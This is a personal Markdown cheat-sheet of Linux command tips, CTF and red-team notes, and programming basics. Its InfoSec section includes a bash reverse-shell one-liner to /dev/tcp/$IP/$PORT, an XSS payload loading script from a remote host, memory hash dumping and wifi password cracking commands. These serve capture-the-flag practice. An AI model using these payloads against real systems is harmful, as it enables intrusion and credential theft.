---
title: Tips and tricks on computer
author: João Fukuda
---

* [Linux](#linux)
* [InfoSec](#infosec)
* [Programming](#programming)

# Linux

Programs list:

* sort
* uniq
* tr
* rev
* echo
* bc
* gnuplot
* xargs
* convert
* gnuplot

## awk

Work with tables and column outputs in Linux.

* from [here](https://www.youtube.com/watch?v=sz_dsktIjt4)

Print only second column
```bash
awk '{print $2}'
```

Match and Regex
```bash
# First column equals '1' and second matches regex
awk '$1 == 1 && $2 ~ /^c.*e$/ {print $0}'
```

Count number of lines
```bash
# First column equals '1' and second matches regex
awk 'BEGIN { rows = 0 }$1 == 1 && $2 ~ /^c.*e$/ { rows += 1 } END {print rows}'
```

## sed

Substitute editor

`-E`{bash} for Perl's regex syntax.

Replace first
```sed
s/find/replace/
```

Replace all
```sed
s/find/replace/g
```

Delete line
```sed
/find/d
```

Show first `10` lines
```sed
10q
```

Edits document in-place
```bash
sed -i 's/<pattern>/<subst>/'
```

Use the matching group
```bash
sed -E 's/(patt1) (patt2)/\2/' # replaces \2 with patt2's match
```

Use non greedy match instead of getting the biggest possible match
```bash
# ? before * or +
sed -E 's/.*? (<pattern2>)//'
```

Ignore group matching for matches inside `()`
```bash
# (?:<pattern>)
sed -E 's/(?:.*)//'
```

## paste

Get lines from stdin and print delimited by comma
```bash
paste -sd,
```

## ffmpeg

Get screenshot to `feh`
```bash
ffmpeg -i /dev/video0 -frames 1 -f image2 - | feh -
```

Get video to `vlc`
```bash
ffmpeg -i /dev/video0 -f mpegts - | vlc -
```

## make

Makes with dependencies. If no dependencies change, make won't do anything but if any of those change, make will only do the minimal amount of work to make the final target file.
```make
target.pdf: target.md dep1.png
	pandoc -o target.pdf target.md

dep1.png: dep1.plt
	gnuplot dep1.plt
```

Pattern matching. Swaps `$*` for whatever was matched by the wildcard `%` and `$@` by the target output.
```make
target.pdf: target.md plot-dep.png
	pandoc -o target.pdf target.md

plot-%.png: %.plt
	gnuplot $*.plt -o $@
```

# InfoSec

## Red Team

### CTF Websites

#### Infos

* CTFTime
* CTF101

#### Challenges

* Crackmes.one
* CryptoHack
* Cryptopals
* Damn Vulnerable Hub
* Exploit Education
* HackTheBox
* HackThisSite
* Lord of SQL Injection
* Metasploitable
* Microcorruption
* Nightmare
* OverTheWire - Bandit
* OverTheWire - Natas
* PicoCTF
* Pwnable.{xyz,kr,tw}
* RingZer0
* RPOemporium
* SANS Holiday Hack Challenges
* SmashTheStack
* TryHackMe
* VulnHub

### General

#### Hash Cracking

* john
* hashcat
* hashid
* haiti

### Web

#### Useful links

* requestcatcher.com
* requestbin.net

#### Useful Tools

* sublist3r

#### curl

Get verbose request
```bash
curl -v url
```

Make post request
```bash
curl -X POST url
# or
curl -d data url
```
> Hint:
>
> -d could be `cat file`

#### wget

Crawler
```bash
wget --spider -r -nv --level {0,N} -e robots=off url
```

#### XSS

14.rs
```html
<script src="//14.rs"></script>
```

### Binary Exploit

* Ghidra

#### Radare2

Enter with analysis on
```bash
r2 -AA <file>
```

Visual mode
```
# Enter Visual Mode
> v<CR>

# On Visual Mode
<space>: Enter block mode
_: List/Goto symbols
```

### Forensics

#### Steganography

* exiftool
* steghide - jpeg
* zsteg - png, bmp
* stegcracker
* stegoveritas - image filters

#### Binwalk

Extract all:
```bash
binwalk --dd='.*' file
```

#### Volatility

Memory dump tool

Check dump profile
```bash
volatility -f file imageinfo
```

Get console log
```bash
volatility -f file --profile=<profile> consoles
```

Get processes list
```bash
volatility -f file --profile=<profile> {pstree,psscan}
```

Hash dump
```bash
volatility -f file --profile=<profile> hashdump
```

### Networking

* Nikto

#### Rev Shell

```bash
bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
```

For better performance, use `pwncat`

#### Wifi Cracking

##### aircrack-ng suite

Crack wifi passwords from `.pcap` files
```bash
aircrack-ng file wordlist
```

#### Traffic Analysis

##### tshark

Filter outputs
```bash
tshark -r file -Y filter

# Useful filters:
#
# ip.{addr,src,dst}
# http[.method]
# tcp[.{port,src,dst}]
# frame.number
```

Get files (or use tcpflow)
```bash
# prot (transport protocol): tcp, udp, tls, http2, quic
# mode (output): ascii (ascii + '.' as non-print), ebcdic, hex (hexa + ascii), raw (hexa)
# filter (which flow to follow): index, ip + port pair
tshark -r file -z follow,prot,mode,filter[,range]

# Example:
tshark -r file -z "follow,tcp,ascii,200.57.7.197:32891,200.57.7.198:2906"
```

# Programming

## Versioning

### Semantic version number

```
8.1.7
^ ^ ^
| | +-> patch
| +---> minor
+-----> major
```

#### Increment

* Patch:
: **Entirely** backwards compatible version (ex.: security patches)
* Minor:
: New functions
* Major:
: Backwards **incompatible** change

### Lock files

Locks dependency versions

#### Vendering

Put the dependencies **inside** your project and ship program with it

## Testing

#### Unit test

Small tests for unique functions

#### Integration test

Test integration of multiple subsystem

#### Regression test

Test something that was broken before to prevent its reintroduction

### Mocking

Replace parts of code to simulate a simpler environment

